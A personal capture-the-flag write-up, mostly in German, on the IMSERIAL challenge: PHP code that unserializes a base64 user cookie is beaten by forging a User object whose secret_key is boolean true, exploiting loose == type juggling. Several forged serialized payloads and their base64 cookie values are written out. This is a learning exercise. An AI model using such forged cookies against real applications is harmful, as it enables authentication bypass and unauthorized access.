# IMSERIAL  

## code 

#### before login: 
url: 
```php
<?php
include("user.php");

// manage the input fields/post requests
if ($_POST) {
    if ($_POST['user'] === "admin") {
        die("YOU CAN'T BE ADMIN!!");
    } else {
        // if you don't try to be admin
        // a new user is created 
        // with the attributes from the input field 
        $u = new User($_POST['user'], $_POST['key']);

        // das user objekt wird serialized
        // dann wird das serializte user objekt base64 encoded
        // dann wird das als value in einen cookie getan mit key "user"
        setcookie("user", base64_encode(serialize($u)));

        // then the header is printed (the code we get afterwards)
        header("Location: app.php");
    }
}

// wenn source=1 als paramter zeigt der den code 
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
}
?>

<html><head><title>Login</title>
<body>
<form method="post" >
<div class="box">
<h1>SignUp</h1>

<input type="text" name="user" value="user" class="email" />
<input type="text" name="key" value="key" class="email" />

<input type="submit" value="Sign Up" class="btn" />
<a href="index.php?source=1">Source</a>

</div> 

</form>
</body>
</html>
``

#### after log in: 
url: http://vuln3.redrocket.club:8000/app.php
```php
<?php
// files are included 
include "user.php";
include "flag.php";
// hier wird das user-objekt unserialized 
$u = unserialize(base64_decode($_COOKIE['user']));

if ($u->name == "admin" && $u->secret_key == $SECRET_KEY) {
    echo $flag;
}

highlight_file(__FILE__);
```

## Infos
* der input wird mit base64 gedecoded 
* der username muss admin sein 
* und der secret key muss der variable secret key entsprechen 
* da die da aber iwie nirgendwo gesetzt wird, vllt kann man einfach $SECRET_KEY als input nehmen 
* oder die variable sogar vorher iwo setzen? 
* kann man vllt auch RCE iwo erreichen und die flag mit echo $flag ausgeben? 

## Fragen
* Wie krieg ich den fake in die app.php website? 
Indem ich es als cookie setze 

## Strategie
* das serializte Objekt faken 
* das base64 encoden 
* dann setz ich das als user cookie in die website 
* und dann sollte der das ja deserializen wenn ich auf login klicke
* oder vllt wenn ich bei app.php auf reload klicke 

### Das serializte Objekt faken 
1. Wie erfülle ich die Kriterien? 
```php
if ($u->name == "admin" && $u->secret_key == $SECRET_KEY) {
    echo $flag;
}
```

* da die Überprüfung ob der username string == "admin" ist, am Anfang stattfindet ist es kein Problem, wenn ich "admin" in dem fake objekt verwende
* wenn man den secret_key im Userobjekt auf $SECRET_KEY setzt, wird vllt die variable aufgerufen und dann ist das auch true
* oder kann man vllt mit Injection iwie einen Kommentar einfügen? bzw. anderen php code der den Vergleich killt? 
* Lösung: "admin" und als für den secret key einfach die variable auf true setzen, weil es nur ein == Vergleich ist und kein === Vergleich 

2. Form des Objekts: 
Welche Formate es im Serialized-Objekt gibt: https://www.php.net/manual/de/function.serialize.php
Man kann das Standard-Format für php-serialized objects benutzen: 
Versuch 1
```php
O:4:"User":1:{s:4:"user";s:5:"admin";s:3:"key";s:11:"$SECRET_KEY";}
```

Versuch 2
```php
O:4:"User":{s:4:"user";s:5:"admin";s:3:"key";s:11:"$SECRET_KEY";}
```

Versuch 3 (einfach den createten cookie genommen, base64 decoded und neue Werte rein)
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";s:11:"$SECRET_KEY";}
Alternativ hätte man das auch im Code im if sehen können dass die Attribute name und secret_key heißen 

Versuch 4 (anscheinend klappt $SECRET_KEY nicht weil das im String steht)
Injection: " == "" || "hallo 
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";s:17:"" == "" || "hallo";}

(Tipp von Fabian: == ausnutzen: gibt true zurück wenn nach typ-jonglage beides gleich ist)
Hier ist dazu nochmal die Vergleichstabelle: https://www.php.net/manual/de/types.comparisons.php

Versuch 5 (falls string, der sollte bei true true sein (DAS HIER IST DIE LÖSUNG))
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";b:1;}

Versuch 6 (falls string versuch 2)
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";i:0;}

Versuch 7 (falls secret key null oder 0 ist)
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";b:0;}

Versuch 8 (falls secret key null ist)
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";N;}

Versuch 9 
O:4:"User":2:{s:4:"name";s:5:"admin";s:10:"secret_key";i:1;}

eigentlich, wenn es irgendein string ist müsste es doch b:1 sein 
--> war auch so, da war irgendein Fehler 


3. base64-encoding
Versuch 1
Tzo0OiJVc2VyIjoxOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6Mzoia2V5IjtzOjExOiIkU0VDUkVUX0tFWSI7fQ==

Versuch 2
Tzo0OiJVc2VyIjp7czo0OiJ1c2VyIjtzOjU6ImFkbWluIjtzOjM6ImtleSI7czoxMToiJFNFQ1JFVF9LRVkiO30=

Versuch 3
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO3M6MTE6IiRTRUNSRVRfS0VZIjt9

Versuch 4
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO3M6MTc6IiIgPT0gIiIgfHwgImhhbGxvIjt9

Versuch 5 (hier hab ich b:true geschrieben, es hätte b:1 sein sollen)
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO2I6dHJ1ZTt9

Versuch 6
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO2k6MDt9

Versuch 7 b:1
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO2I6MDt9

Versuch 8 Null 
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO047fQ==

Versuch 9 i 1
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO2k6MTt9

Lösung: b:1 also boolean true 
Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MTA6InNlY3JldF9rZXkiO2I6MTt9

## set cookie
Der cookie kann im Browser gesetzt werden. 





